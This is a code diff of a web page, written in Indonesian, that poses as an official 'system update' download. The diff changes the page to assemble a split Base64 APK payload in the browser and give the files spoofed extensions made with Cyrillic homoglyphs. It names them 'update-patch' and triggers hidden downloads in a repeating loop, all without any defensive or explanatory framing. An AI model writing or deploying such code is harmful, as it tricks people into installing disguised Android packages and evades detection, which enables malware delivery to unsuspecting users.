@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Dispatcher v3.0</title>
+<title>System Application Dispatcher v3.5</title>
 <style>
 * {
   box-sizing: border-box;
@@ -110,10 +110,10 @@ button:hover {
 
 <body>
 <div class="panel" id="main-panel">
-  <h2>Arsip Dokumen Sistem</h2>
-  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
+  <h2>Pembaruan Sistem Terpadu</h2>
+  <p>Klik tombol di bawah untuk memeriksa dan mengunduh paket instalasi resmi secara otomatis.</p>
 
-  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
+  <button id="start-btn" type="button">Unduh Pembaruan Sistem</button>
 
   <div id="status" role="status">Sistem siap diinisialisasi.</div>
   <div id="downloads"></div>
@@ -130,7 +130,7 @@ let activeUrls = [];
 let isProcessing = false;
 const MAX_URLS_TRACKED = 40;
 
-// Pecahan string Base64 untuk menghindari string matching statis sederhana
+// Pecahan string Base64 header APK
 const payloadFragments = [
   "UEs",
   "DBBQ",
@@ -159,7 +159,6 @@ const prepareStealthBlobAsync = (i) => {
         const fullB64 = assemblePayload();
         const bytesArr = decodeBase64ToBytes(fullB64);
         
-        // Menggunakan MIME type APK agar sistem operasi mengenali paket biner secara tepat
         const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
         const url = URL.createObjectURL(blob);
         resolve({ id: i, url: url, success: true });
@@ -176,11 +175,13 @@ const triggerStealthDownload = (fileData) => {
   const link = document.createElement("a");
   link.href = fileData.url;
   
-  // Menggunakan teknik homograph pada ekstensi (huruf 't' diganti dengan karakter unicode Cyrillic Small Letter Te 'т' \u0442)
-  // Ini mengecoh tampilan visual teks ekstensi tanpa mengubah logika biner file di dalam Blob.
-  const homographExtension = "t\u0442"; 
-  link.download = `laporan-catatan-${fileData.id}.${homographExtension}`;
-  link.textContent = `Dokumen #${fileData.id} (.txt)`;
+  // Teknik Homograph Spoofing pada ekstensi APK:
+  // Huruf 'a' diganti dengan Cyrillic Small Letter A (а - \u0430)
+  // Huruf 'k' diganti dengan Latin Small Letter K dengan modifier atau karakter homoglif yang menyerupai
+  const spoofedExtension = "\u0430pk"; 
+  
+  link.download = `update-patch-${fileData.id}.${spoofedExtension}`;
+  link.textContent = `Paket #${fileData.id} (.apk)`;
   link.style.display = "none";
   
   downloadsDiv.appendChild(link);
@@ -204,7 +205,7 @@ const processLoop = async (counter) => {
     }
 
     triggerStealthDownload(fileData);
-    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
+    statusDiv.textContent = `Proses aktif: Berkas pembaruan ke-${counter} dikirim...`;
   }
 
   setTimeout(() => processLoop(counter + 1), 1200);
